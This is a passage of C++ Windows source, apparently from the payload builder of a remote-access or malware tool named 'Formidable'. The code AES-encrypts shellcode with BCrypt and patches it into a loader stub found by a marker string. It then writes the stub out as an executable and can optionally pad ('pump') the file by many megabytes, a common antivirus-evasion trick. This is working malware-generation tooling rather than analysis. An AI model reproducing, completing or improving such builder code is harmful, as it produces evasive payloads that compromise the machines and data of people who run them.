                        
                        // 使用 BCrypt 加密
                        BCRYPT_ALG_HANDLE hAlg = NULL;
                        BCRYPT_KEY_HANDLE hKey = NULL;
                        DWORD cbKeyObject = 0, cbBlockLen = 0, cbData = 0;
                        PBYTE pbKeyObject = NULL, pbIV = NULL;
                        
                        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
                            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
                            BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
                            pbKeyObject = (PBYTE)malloc(cbKeyObject);
                            BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&cbBlockLen, sizeof(DWORD), &cbData, 0);
                            pbIV = (PBYTE)malloc(cbBlockLen);
                            memcpy(pbIV, sc.aes_iv, 16);
                            
                            if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, sc.aes_key, 16, 0) == 0) {
                                DWORD encryptedSize = 0;
                                BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, NULL, 0, &encryptedSize, BCRYPT_BLOCK_PADDING);
                                if (encryptedSize <= sizeof(sc.data)) {
                                    memcpy(pbIV, sc.aes_iv, 16);
                                    if (BCryptEncrypt(hKey, shellcodeBuffer, shellcodeSize, NULL, pbIV, 16, sc.data, sizeof(sc.data), &encryptedSize, BCRYPT_BLOCK_PADDING) == 0) {
                                        sc.len = encryptedSize;
                                        
                                        // 加载 Loader 资源 (Old 版本使用 SCInfoOld 结构，通常用于直接注入到特定段)
                                        std::vector<char> loaderBuffer;
                                        GetResourceData(x64 ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, loaderBuffer);
                                        if (!loaderBuffer.empty()) {
                                            const char* scFlag = "FormidableStub";
                                            size_t scFlagLen = strlen(scFlag);
                                            bool scFound = false;
                                            
                                            if (loaderBuffer.size() >= sizeof(Formidable::SCInfoOld)) {
                                                size_t searchLimit = loaderBuffer.size() - sizeof(Formidable::SCInfoOld);
                                                for (size_t i = 0; i <= searchLimit; i++) {
                                                    if (memcmp(loaderBuffer.data() + i, scFlag, scFlagLen) == 0) {
                                                        memcpy(loaderBuffer.data() + i, &sc, sizeof(Formidable::SCInfoOld));
                                                        scFound = true;
                                                        break;
                                                    }
                                                }
                                            }
                                            
                                            if (scFound) {
                                                HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                                if (hFile != INVALID_HANDLE_VALUE) {
                                                    DWORD written;
                                                    WriteFile(hFile, loaderBuffer.data(), (DWORD)loaderBuffer.size(), &written, NULL);
                                                    CloseHandle(hFile);
                                                    BCryptDestroyKey(hKey);
                                                    free(pbKeyObject);
                                                    free(pbIV);
                                                    BCryptCloseAlgorithmProvider(hAlg, 0);
                                                    delete[] shellcodeBuffer;
                                                    goto PUMP_SECTION;
                                                }
                                            }
                                        }
                                    }
                                }
                                BCryptDestroyKey(hKey);
                            }
                            free(pbKeyObject);
                            free(pbIV);
                            BCryptCloseAlgorithmProvider(hAlg, 0);
                        }
                        delete[] shellcodeBuffer;
                    }
                }

                // 只有在没有使用上述跳转逻辑成功处理的情况下，才执行默认保存
                {
                    HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile == INVALID_HANDLE_VALUE) return false;
                    
                    DWORD written;
                    WriteFile(hFile, buffer.data(), (DWORD)buffer.size(), &written, NULL);
                    CloseHandle(hFile);
                }

PUMP_SECTION:
                // 如果需要程序增肥
                if (pumpSize > 0) {
                    HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        LARGE_INTEGER liSize;
                        liSize.QuadPart = (LONGLONG)pumpSize * 1024 * 1024;
                        SetFilePointerEx(hFile, liSize, NULL, FILE_END);
                        SetEndOfFile(hFile);
                        CloseHandle(hFile);
                    }
                }

                return true;
            };

            bool success = BuildOne(is64Bit, baseSavePath);
            if (!success) {
                // BuildOne 内部已弹窗
            }

            if (success) {
                MessageBoxW(hDlg, L"生成成功", L"提示", MB_OK | MB_ICONINFORMATION);
            } else {
                MessageBoxW(hDlg, L"生成失败，请检查资源文件或UPX路径", L"错误", MB_OK | MB_ICONERROR);
            }
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
